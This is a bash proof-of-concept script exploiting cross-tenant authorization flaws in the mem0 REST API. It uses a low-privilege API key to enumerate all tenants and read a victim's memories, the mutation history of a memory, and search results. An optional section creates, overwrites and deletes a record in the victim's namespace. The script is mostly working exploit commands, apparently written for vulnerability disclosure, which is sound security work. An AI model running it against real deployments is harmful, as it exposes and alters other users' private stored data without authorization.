#!/usr/bin/env bash
# mem0 REST API cross-tenant memory access PoC.
# Read-only until the final optional section (which targets a throwaway record).
#
# Usage: BASE=http://127.0.0.1:8000 KEY=<role=user key> VICTIM=alice_tenant ./poc_cross_tenant.sh
#        READ_ONLY=0 ...  # additionally prove PUT/DELETE on a synthetic record
set -euo pipefail

BASE="${BASE:-http://127.0.0.1:8000}"
KEY="${KEY:?set KEY to a role=user API key}"
H="X-API-Key: $KEY"

echo "[1] Enumerate every tenant (any authenticated user)"
curl -s "$BASE/entities" -H "$H" | tee /tmp/entities.json
echo

VICTIM="${VICTIM:?set VICTIM to a user_id from step 1}"
echo "[2] Read victim memories as $VICTIM"
curl -s "$BASE/memories?user_id=$VICTIM" -H "$H" | tee /tmp/memories.json
echo

MID=$(python3 -c 'import json;print(json.load(open("/tmp/memories.json"))["results"][0]["id"])')
echo "[3] Read single memory by ID (no ownership check): $MID"
curl -s "$BASE/memories/$MID" -H "$H"; echo

echo "[4] Read full mutation history of the victim memory"
curl -s "$BASE/memories/$MID/history" -H "$H"; echo

echo "[5] Semantic search confined to the victim namespace"
curl -s -X POST "$BASE/search" -H "$H" -H 'Content-Type: application/json' \
  -d "{\"query\":\"secret\",\"filters\":{\"user_id\":\"$VICTIM\"},\"threshold\":0}" ; echo

echo "[6] Negative control: unfiltered listing is role-gated (expect 403)"
curl -s -o /dev/null -w "GET /memories -> %{http_code}\n" "$BASE/memories" -H "$H"

if [ "${READ_ONLY:-1}" = "0" ]; then
  echo "[7] Write/delete capability on a throwaway record"
  # created under the victim namespace; DELETE is scoped to this ID only
  TID=$(curl -s -X POST "$BASE/memories" -H "$H" -H 'Content-Type: application/json' \
        -d "{\"messages\":[{\"role\":\"user\",\"content\":\"throwaway-poc-record\"}],\"user_id\":\"$VICTIM\",\"infer\":false}" \
        | python3 -c 'import sys,json;print(json.load(sys.stdin)["results"][0]["id"])')
  curl -s -o /dev/null -w "PUT    -> %{http_code}\n" -X PUT "$BASE/memories/$TID" -H "$H" \
       -H 'Content-Type: application/json' -d '{"text":"overwritten-by-lowpriv-key"}'
  curl -s -o /dev/null -w "DELETE -> %{http_code}\n" -X DELETE "$BASE/memories/$TID" -H "$H"
fi
